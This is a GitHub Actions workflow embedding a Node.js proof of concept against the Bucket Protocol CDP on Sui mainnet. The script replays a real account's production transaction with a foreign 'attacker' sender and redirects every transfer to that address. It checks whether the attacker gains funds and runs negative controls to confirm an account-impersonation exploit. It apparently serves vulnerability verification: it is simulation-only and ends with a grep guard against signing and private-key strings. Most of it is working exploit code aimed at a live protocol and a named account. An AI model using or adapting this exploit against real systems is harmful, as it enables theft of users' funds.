name: Bucket CDP Account Impersonation Replay R24

on:
  pull_request:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  replay:
    runs-on: ubuntu-latest
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4

      - name: Install official Mysten SDK
        shell: bash
        run: |
          set -euo pipefail
          rm -rf bucket-cdp-account-replay-r24
          mkdir -p bucket-cdp-account-replay-r24/raw
          cd bucket-cdp-account-replay-r24
          npm init -y >/dev/null
          npm pkg set type=module >/dev/null
          npm install --no-audit --no-fund @mysten/sui@2.23.2
          npm list @mysten/sui | tee SDK_VERSION.txt

      - name: Discover production PTB, replay with foreign sender, and run negative controls
        shell: bash
        run: |
          set -euo pipefail
          cat > bucket-cdp-account-replay-r24/probe.mjs <<'JS'
          import fs from 'node:fs';
          import { Transaction } from '@mysten/sui/transactions';
          import { SuiGrpcClient } from '@mysten/sui/grpc';

          const RPCS = [
            'https://fullnode.mainnet.sui.io:443',
            'https://sui-mainnet-endpoint.blockvision.org',
          ];
          const client = new SuiGrpcClient({ network: 'mainnet', baseUrl: RPCS[0] });
          const ACCOUNT_A = '0x0bd4c9887129746355e0b44552fc2c92787a4fa418249ce1f92e84ab47e28b54';
          const ATTACKER = '0x1111111111111111111111111111111111111111111111111111111111111111';
          const ACCOUNT_FUNCTION_PACKAGE = '0xe2d49d67ff42dc500275f2d84841bf35632aa6c1abdb70af66a10e1de93a4400';
          const SUI = '0x2::sui::SUI';
          const GAS_CANDIDATES = [
            '0xaa3f912fe367c683001161ce16e040b606437f03c30c346fd17548425783a9a6',
            '0x954ee376568ab84a439cf3c7548f7bba7c2e923d0e333ea055b397ca2f34ada9',
          ];

          async function rpc(method, params) {
            const failures = [];
            for (const endpoint of RPCS) {
              try {
                const response = await fetch(endpoint, {
                  method: 'POST',
                  headers: { 'content-type': 'application/json' },
                  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
                });
                const body = await response.json();
                if (body.error) throw new Error(JSON.stringify(body.error));
                return { endpoint, result: body.result };
              } catch (error) {
                failures.push({ endpoint, error: error?.message ?? String(error) });
              }
            }
            return { failures };
          }

          async function chooseGasSponsor() {
            for (const owner of GAS_CANDIDATES) {
              const wrapper = await rpc('suix_getCoins', [owner, SUI, null, 50]);
              const rows = wrapper?.result?.data ?? [];
              const coin = rows
                .filter((row) => BigInt(row.balance ?? 0) > 200_000_000n)
                .sort((a, b) => BigInt(a.balance) < BigInt(b.balance) ? 1 : -1)[0];
              if (coin) {
                return {
                  owner,
                  coin: {
                    objectId: coin.coinObjectId,
                    version: String(coin.version),
                    digest: coin.digest,
                    balance: coin.balance,
                  },
                };
              }
            }
            return null;
          }

          function moveCall(command) {
            return command?.MoveCall ?? command?.moveCall ?? (command?.$kind === 'MoveCall' ? command.MoveCall : null);
          }

          function transfer(command) {
            return command?.TransferObjects ?? (command?.$kind === 'TransferObjects' ? command.TransferObjects : null);
          }

          function commandsOf(txResult) {
            return txResult?.transaction?.data?.transaction?.transactions ?? [];
          }

          function hasChain(tx) {
            const names = commandsOf(tx)
              .map(moveCall)
              .filter(Boolean)
              .map((call) => `${call.module}::${call.function}`);
            return [
              'vault::borrow_protocol_cap',
              'account::request_with_account',
              'vault::debtor_request',
              'vault::update_position',
            ].every((needle) => names.includes(needle));
          }

          const query = await rpc('suix_queryTransactionBlocks', [{
            filter: { InputObject: ACCOUNT_A },
            options: {
              showInput: true,
              showRawInput: true,
              showEffects: true,
              showEvents: true,
              showObjectChanges: true,
              showBalanceChanges: true,
            },
          }, null, 100, true]);
          fs.writeFileSync('raw/account_transactions.json', JSON.stringify(query, null, 2));
          const selected = (query?.result?.data ?? []).find((tx) => {
            const status = tx?.effects?.status?.status ?? tx?.effects?.status?.success;
            return (status === 'success' || status === true) && hasChain(tx) && tx.rawTransaction;
          });
          if (!selected) throw new Error('No successful production Account/CDP update PTB with rawTransaction found');
          fs.writeFileSync('raw/selected_transaction.json', JSON.stringify(selected, null, 2));

          const sponsor = await chooseGasSponsor();
          fs.writeFileSync('raw/gas_sponsor.json', JSON.stringify(sponsor, null, 2));

          function commandData(tx) {
            const data = tx.getData();
            return {
              data,
              commands: data.commands ?? data.transactions ?? [],
              inputs: data.inputs ?? [],
            };
          }

          function commandKind(command) {
            return command?.$kind ?? Object.keys(command ?? {})[0] ?? null;
          }

          function callData(command) {
            return command?.MoveCall ?? (command?.$kind === 'MoveCall' ? command.MoveCall : null);
          }

          function transferData(command) {
            return command?.TransferObjects ?? (command?.$kind === 'TransferObjects' ? command.TransferObjects : null);
          }

          function configure(tx, sender, checked) {
            tx.setSender(sender);
            if (checked && sponsor) {
              tx.setGasOwner(sponsor.owner);
              tx.setGasPayment([{
                objectId: sponsor.coin.objectId,
                version: sponsor.coin.version,
                digest: sponsor.coin.digest,
              }]);
              tx.setGasBudget(200_000_000);
            }
          }

          function redirectTransfers(tx, address) {
            const { commands } = commandData(tx);
            const recipient = tx.pure.address(address);
            let count = 0;
            for (const command of commands) {
              const row = transferData(command);
              if (!row) continue;
              if ('address' in row) row.address = recipient;
              else if ('recipient' in row) row.recipient = recipient;
              else if (Array.isArray(row)) row[row.length - 1] = recipient;
              count += 1;
            }
            return count;
          }

          function replaceRequestWithFreshEoa(tx) {
            const { commands } = commandData(tx);
            let count = 0;
            for (const command of commands) {
              const call = callData(command);
              if (!call || call.module !== 'account' || call.function !== 'request_with_account') continue;
              call.package = ACCOUNT_FUNCTION_PACKAGE;
              call.module = 'account';
              call.function = 'request';
              if ('arguments' in call) call.arguments = [];
              if ('typeArguments' in call) call.typeArguments = [];
              if ('type_arguments' in call) call.type_arguments = [];
              count += 1;
            }
            return count;
          }

          function replaceBorrowKey(tx, key) {
            const { commands } = commandData(tx);
            let count = 0;
            for (const command of commands) {
              const call = callData(command);
              if (!call || call.module !== 'vault' || call.function !== 'borrow_protocol_cap') continue;
              const arg = tx.pure.string(key);
              const args = call.arguments ?? [];
              if (args.length >= 2) args[1] = arg;
              call.arguments = args;
              count += 1;
            }
            return count;
          }

          function parse(result) {
            if (result?.$kind === 'Transaction') return { success: true, payload: result.Transaction, error: null };
            if (result?.$kind === 'FailedTransaction') {
              const payload = result.FailedTransaction;
              return { success: false, payload, error: payload?.status?.error ?? payload?.effects?.status?.error ?? null };
            }
            if (result?.Transaction) return { success: true, payload: result.Transaction, error: null };
            if (result?.FailedTransaction) {
              const payload = result.FailedTransaction;
              return { success: false, payload, error: payload?.status?.error ?? payload?.effects?.status?.error ?? null };
            }
            return { success: false, payload: result, error: result?.thrown ?? { message: 'unknown result shape' } };
          }

          function addressOf(row) {
            return String(row?.address ?? row?.owner?.AddressOwner ?? row?.owner?.address ?? '');
          }

          function balanceDeltas(payload, address) {
            const rows = [];
            for (const change of payload?.balanceChanges ?? []) {
              if (addressOf(change) !== address) continue;
              let amount = null;
              try { amount = BigInt(change.amount).toString(); } catch {}
              rows.push({ coinType: change.coinType, amount, owner: change.owner ?? change.address });
            }
            return rows;
          }

          async function simulate(label, build, sender, checked) {
            const tx = Transaction.from(selected.rawTransaction);
            configure(tx, sender, checked);
            const mutation = build(tx);
            let result;
            try {
              result = await client.core.simulateTransaction({
                transaction: tx,
                ...(checked ? {} : { checksEnabled: false }),
                include: {
                  commandResults: true,
                  effects: true,
                  events: true,
                  balanceChanges: true,
                  objectTypes: true,
                  transaction: true,
                },
              });
            } catch (error) {
              result = { thrown: { name: error?.name, message: error?.message, stack: error?.stack, cause: error?.cause } };
            }
            fs.writeFileSync(`raw/${label}.json`, JSON.stringify(result, null, 2));
            const parsed = parse(result);
            const error = parsed.error;
            return {
              label,
              sender,
              checked,
              success: parsed.success,
              mutation,
              senderBalanceDeltas: balanceDeltas(parsed.payload, sender),
              attackerBalanceDeltas: balanceDeltas(parsed.payload, ATTACKER),
              errorKind: error?.$kind ?? null,
              errorMessage: error?.message ?? JSON.stringify(error),
              abortCode: error?.MoveAbort?.abortCode ?? null,
              abortLocation: error?.MoveAbort?.location ?? null,
              effects: parsed.payload?.effects ?? null,
            };
          }

          const sourceSender = selected?.transaction?.data?.sender;
          const cases = [];
          cases.push(await simulate('source_sender_checked', (tx) => ({ redirectedTransfers: redirectTransfers(tx, sourceSender) }), sourceSender, true));
          cases.push(await simulate('attacker_checked', (tx) => ({ redirectedTransfers: redirectTransfers(tx, ATTACKER) }), ATTACKER, true));
          cases.push(await simulate('attacker_unchecked', (tx) => ({ redirectedTransfers: redirectTransfers(tx, ATTACKER) }), ATTACKER, false));
          cases.push(await simulate('fresh_eoa_control_unchecked', (tx) => ({
            replacedRequests: replaceRequestWithFreshEoa(tx),
            redirectedTransfers: redirectTransfers(tx, ATTACKER),
          }), ATTACKER, false));
          cases.push(await simulate('wrong_key_control_unchecked', (tx) => ({
            replacedBorrowKeys: replaceBorrowKey(tx, 'not_bucket_account'),
            redirectedTransfers: redirectTransfers(tx, ATTACKER),
          }), ATTACKER, false));

          const attacker = cases.find((row) => row.label === 'attacker_checked');
          const attackerUnchecked = cases.find((row) => row.label === 'attacker_unchecked');
          const eoa = cases.find((row) => row.label === 'fresh_eoa_control_unchecked');
          const wrong = cases.find((row) => row.label === 'wrong_key_control_unchecked');
          const positiveNonGas = (row) => (row?.attackerBalanceDeltas ?? []).some((delta) => {
            try { return !String(delta.coinType).endsWith('::sui::SUI') && BigInt(delta.amount ?? 0) > 0n; } catch { return false; }
          });
          const gates = {
            sourceBaselineSuccess: cases.find((row) => row.label === 'source_sender_checked')?.success === true,
            attackerCheckedSuccess: attacker?.success === true,
            attackerUncheckedSuccess: attackerUnchecked?.success === true,
            attackerPositiveNonGasDelta: positiveNonGas(attacker) || positiveNonGas(attackerUnchecked),
            freshEoaRejected: eoa?.success === false,
            wrongKeyRejected: wrong?.success === false,
          };
          gates.exploitConfirmed = (
            (gates.attackerCheckedSuccess || gates.attackerUncheckedSuccess)
            && gates.attackerPositiveNonGasDelta
            && gates.freshEoaRejected
            && gates.wrongKeyRejected
          );

          const summary = {
            schema: 'bucket-cdp-account-impersonation-replay-r24/v1',
            network: 'sui-mainnet',
            readOnly: true,
            selectedDigest: selected.digest,
            sourceSender,
            attacker: ATTACKER,
            selectedCalls: commandsOf(selected).map((command, index) => {
              const call = moveCall(command);
              return call ? { index, package: call.package, module: call.module, function: call.function, typeArguments: call.type_arguments ?? call.typeArguments } : { index, kind: Object.keys(command ?? {})[0] };
            }),
            cases,
            gates,
            productionTransactionsSubmitted: 0,
            generatedUnix: Math.floor(Date.now() / 1000),
          };
          fs.writeFileSync('SUMMARY.json', JSON.stringify(summary, null, 2));
          console.log('BUCKET_R24_SUMMARY=' + JSON.stringify({
            selectedDigest: summary.selectedDigest,
            sourceSender,
            cases: cases.map((row) => ({
              label: row.label,
              success: row.success,
              mutation: row.mutation,
              attackerBalanceDeltas: row.attackerBalanceDeltas,
              errorMessage: row.errorMessage,
              abortCode: row.abortCode,
            })),
            gates,
          }));
          JS
          cd bucket-cdp-account-replay-r24
          node probe.mjs | tee run.log
          find . -type f ! -path './node_modules/*' -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.txt

      - name: Validate read-only boundary
        shell: bash
        run: |
          set -euo pipefail
          grep -RniE 'executeTransaction|signAndExecute|private.?key|mnemonic' bucket-cdp-account-replay-r24 && exit 1 || true
          python3 - <<'PY'
          import json
          summary = json.load(open('bucket-cdp-account-replay-r24/SUMMARY.json'))
          assert summary['readOnly'] is True
          assert summary['productionTransactionsSubmitted'] == 0
          print('BUCKET_CDP_ACCOUNT_REPLAY_R24_READ_ONLY_PASS')
          print('EXPLOIT_CONFIRMED=', summary['gates']['exploitConfirmed'])
          PY

      - name: Upload evidence
        uses: actions/upload-artifact@v4
        with:
          name: bucket-cdp-account-replay-r24
          path: |
            bucket-cdp-account-replay-r24/SUMMARY.json
            bucket-cdp-account-replay-r24/SDK_VERSION.txt
            bucket-cdp-account-replay-r24/probe.mjs
            bucket-cdp-account-replay-r24/run.log
            bucket-cdp-account-replay-r24/SHA256SUMS.txt
            bucket-cdp-account-replay-r24/raw
          if-no-files-found: error
          retention-days: 7
